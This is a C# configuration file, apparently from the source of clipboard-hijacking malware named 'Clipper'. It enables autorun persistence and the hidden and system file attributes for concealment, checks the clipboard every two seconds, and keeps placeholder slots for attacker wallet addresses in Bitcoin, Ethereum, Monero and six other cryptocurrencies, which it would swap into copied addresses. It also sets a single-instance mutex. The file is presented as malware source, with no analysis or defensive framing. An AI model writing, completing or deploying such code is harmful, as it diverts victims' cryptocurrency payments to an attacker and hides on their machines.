using System.Collections.Generic;

namespace Clipper
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Clipper";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace 
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            {"btc", "" }, // Bitcoin
            {"eth", "" }, // Ethereum
            {"xmr", "" }, // Monero
            {"xlm", "" }, // Stellar
            {"xrp", "" }, // Ripple
            {"ltc", "" }, // Litecoin
            {"nec", "" }, // Neocoin
            {"bch", "" }, // Bitcoin Cash
            {"dash", "" } // Dashcoin
        };
        // Mutex (random)
        public static string mutex = "sdh34yszdfgb";

    }
}
